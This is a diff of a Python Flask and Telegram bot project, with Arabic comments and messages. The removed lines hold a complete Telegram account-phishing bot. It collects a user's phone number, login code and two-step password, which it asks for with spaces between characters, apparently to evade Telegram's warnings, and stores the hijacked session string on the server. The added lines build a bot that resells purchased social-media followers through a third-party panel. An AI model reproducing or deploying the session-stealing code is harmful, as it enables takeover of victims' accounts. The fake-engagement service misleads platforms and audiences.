@@ -1,151 +1,170 @@
-import os
-import asyncio
 from flask import Flask, request, jsonify, send_file
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError
-import logging
-
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-API_ID = int(os.environ.get("API_ID", 0))
-API_HASH = os.environ.get("API_HASH", "")
-DASHBOARD_CODE = os.environ.get("DASHBOARD_CODE", "1234")
-BASE_URL = os.environ.get("BASE_URL", "")
+from flask_cors import CORS
+import requests
+import os
+import threading
 
 app = Flask(__name__)
-sessions = {}
+CORS(app)
 
-PHONE, CODE, PASSWORD, DASHBOARD = range(4)
+# ── إعدادات من Railway Environment Variables ──────────────
+DARKFOLLOW_API_URL = "https://darkfollow.shop/api/v2"
+DARKFOLLOW_API_KEY = os.environ.get("DARKFOLLOW_API_KEY", "")
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")
+# رابط موقعك على Railway (يُحدَّث بعد النشر)
+WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://YOUR-APP.up.railway.app/app")
+SUPPORT_USERNAME = "o75ei"
 
-# ── BOT HANDLERS ──
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 أهلاً! أرسل رقم هاتفك مع رمز الدولة\nمثال: +9647801234567"
-    )
-    return PHONE
-
-async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    phone = update.message.text.strip()
-    context.user_data["phone"] = phone
+# ────────────────────────────────────────────────────────────
+# دوال مساعدة
+# ────────────────────────────────────────────────────────────
+def tg(method, payload):
+    """استدعاء Telegram Bot API"""
     try:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        await client.send_code_request(phone)
-        context.user_data["client"] = client
-        await update.message.reply_text("✅ وصلك رمز على تلغرام، أرسله هنا:")
-        return CODE
-    except Exception as e:
-        await update.message.reply_text(f"❌ خطأ: {e}\nحاول مرة ثانية /start")
-        return ConversationHandler.END
-
-async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    code = update.message.text.strip()
-    phone = context.user_data["phone"]
-    client = context.user_data["client"]
-    try:
-        await client.sign_in(phone, code)
-        # نجح بدون 2FA
-        return await finish_login(update, context, client)
-    except SessionPasswordNeededError:
-        # عنده مصادقة ثنائية
-        await update.message.reply_text(
-            "🔐 حسابك عنده مصادقة ثنائية!\n\n"
-            "أرسل كلمة المرور بشكل مفرق\n"
-            "مثال: إذا كلمتك `hello123` أرسلها هكذا:\n"
-            "`h e l l o 1 2 3`\n\n"
-            "⚠️ افرق كل حرف برسالة او بمسافة"
+        r = requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}",
+            json=payload, timeout=10
         )
-        return PASSWORD
+        return r.json()
     except Exception as e:
-        await update.message.reply_text(f"❌ الرمز خاطئ: {e}\nأرسل الرمز مرة ثانية:")
-        return CODE
+        print(f"[TG ERROR] {e}")
+        return {}
 
-async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    raw = update.message.text.strip()
-    
-    # نحذف المسافات ونجمع الحروف
-    # مثال: "h e l l o 1 2 3" تصير "hello123"
-    # مثال: "3 4 5 9 3 9 3" تصير "3459393"
-    password = raw.replace(" ", "")
-    
-    client = context.user_data["client"]
-    phone = context.user_data["phone"]
-    
+def send_notify(text):
+    """إشعار لصاحب البوت"""
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        tg("sendMessage", {"chat_id": TELEGRAM_CHAT_ID,
+                           "text": text, "parse_mode": "HTML"})
+
+def set_bot_commands():
+    """تفعيل أوامر البوت"""
+    tg("setMyCommands", {"commands": [
+        {"command": "start", "description": "فتح التطبيق"},
+        {"command": "support", "description": "الدعم الفني"}
+    ]})
+
+# ────────────────────────────────────────────────────────────
+# Webhook — يستقبل رسائل تلغرام
+# ────────────────────────────────────────────────────────────
+@app.route("/webhook", methods=["POST"])
+def webhook():
+    update = request.get_json()
+    if not update:
+        return "ok"
+
+    msg = update.get("message", {})
+    chat_id = msg.get("chat", {}).get("id")
+    text    = msg.get("text", "")
+    user    = msg.get("from", {})
+    name    = user.get("first_name", "")
+
+    if not chat_id:
+        return "ok"
+
+    # ── /start ─────────────────────────────────────────
+    if text.startswith("/start"):
+        tg("sendMessage", {
+            "chat_id": chat_id,
+            "text": (
+                f"أهلاً {name}! 👋\n\n"
+                "مرحباً بك في <b>White Follow</b> 🌟\n"
+                "اختر من القائمة:"
+            ),
+            "parse_mode": "HTML",
+            "reply_markup": {
+                "inline_keyboard": [
+                    [
+                        {
+                            "text": "🚀 فتح التطبيق",
+                            "web_app": {"url": WEBAPP_URL}
+                        }
+                    ],
+                    [
+                        {
+                            "text": "💬 الدعم الفني",
+                            "url": f"https://t.me/{SUPPORT_USERNAME}"
+                        }
+                    ]
+                ]
+            }
+        })
+
+    # ── /support ───────────────────────────────────────
+    elif text.startswith("/support"):
+        tg("sendMessage", {
+            "chat_id": chat_id,
+            "text": "للتواصل مع الدعم الفني اضغط الزر أدناه 👇",
+            "reply_markup": {
+                "inline_keyboard": [[
+                    {"text": "💬 تواصل مع الدعم",
+                     "url": f"https://t.me/{SUPPORT_USERNAME}"}
+                ]]
+            }
+        })
+
+    return "ok"
+
+# ────────────────────────────────────────────────────────────
+# يخدم ملف الموقع داخل تلغرام WebApp
+# ────────────────────────────────────────────────────────────
+@app.route("/app")
+def serve_app():
+    """يفتح الموقع كـ WebApp داخل تلغرام"""
+    return send_file("index.html")
+
+# ────────────────────────────────────────────────────────────
+# API الطلبات
+# ────────────────────────────────────────────────────────────
+@app.route("/order", methods=["POST"])
+def place_order():
+    data     = request.get_json()
+    service  = data.get("service")
+    link     = data.get("link")
+    quantity = data.get("quantity", 1)
+
+    if not service or not link:
+        return jsonify({"error": "service و link مطلوبان"}), 400
+
     try:
-        await client.sign_in(password=password)
-        return await finish_login(update, context, client)
+        resp   = requests.post(DARKFOLLOW_API_URL, data={
+            "key": DARKFOLLOW_API_KEY, "action": "add",
+            "service": service, "link": link, "quantity": quantity
+        }, timeout=15)
+        result = resp.json()
+
+        if result.get("order"):
+            send_notify(
+                f"✅ <b>طلب جديد!</b>\n"
+                f"📦 الخدمة: <code>{service}</code>\n"
+                f"🔗 الرابط: {link}\n"
+                f"🔢 الكمية: {quantity}\n"
+                f"🆔 رقم الطلب: <b>{result['order']}</b>"
+            )
+            return jsonify({"order": result["order"]})
+        else:
+            return jsonify({"error": result.get("error", "خطأ")}), 400
+
     except Exception as e:
-        await update.message.reply_text(
-            f"❌ كلمة المرور خاطئة\n"
-            "حاول مرة ثانية، تذكر تفرق الحروف بمسافات:"
-        )
-        return PASSWORD
+        return jsonify({"error": str(e)}), 500
 
-async def finish_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client):
-    phone = context.user_data["phone"]
-    session_str = client.session.save()
-    sessions[phone] = session_str
-    user_id = update.effective_user.id
-    dashboard_url = f"{BASE_URL}/dashboard?user={user_id}&code={DASHBOARD_CODE}"
-    keyboard = [[InlineKeyboardButton("🚀 افتح لوحة التحكم", url=dashboard_url)]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        "✅ تم تسجيل الدخول بنجاح!\n\nاضغط الزر لفتح لوحة التحكم:",
-        reply_markup=reply_markup
-    )
-    return ConversationHandler.END
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("تم الإلغاء. اكتب /start للبدء من جديد.")
-    return ConversationHandler.END
-
-# ── FLASK ROUTES ──
+@app.route("/balance")
+def get_balance():
+    try:
+        resp = requests.post(DARKFOLLOW_API_URL, data={
+            "key": DARKFOLLOW_API_KEY, "action": "balance"
+        }, timeout=10)
+        return jsonify(resp.json())
+    except:
+        return jsonify({"error": "فشل"}), 500
 
 @app.route("/")
-def index():
-    return send_file("index.html")
+def home():
+    return jsonify({"status": "✅ السيرفر شغال"})
 
-@app.route("/dashboard")
-def dashboard():
-    code = request.args.get("code")
-    if code != DASHBOARD_CODE:
-        return "غير مصرح", 403
-    return send_file("index.html")
-
-@app.route("/api/send", methods=["POST"])
-def send_messages():
-    data = request.json
-    phone = data.get("phone")
-    session_str = sessions.get(phone)
-    if not session_str:
-        return jsonify({"error": "لا توجد جلسة"}), 401
-    return jsonify({"status": "ok"})
-
-# ── MAIN ──
-
-def run_bot():
-    application = Application.builder().token(BOT_TOKEN).build()
-    conv = ConversationHandler(
-        entry_points=[CommandHandler("start", start)],
-        states={
-            PHONE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
-            CODE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
-            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-    )
-    application.add_handler(conv)
-    application.run_polling()
-
+# ────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    import threading
-    t = threading.Thread(target=run_bot)
-    t.daemon = True
-    t.start()
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    # تفعيل أوامر البوت عند بدء التشغيل
+    threading.Thread(target=set_bot_commands, daemon=True).start()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
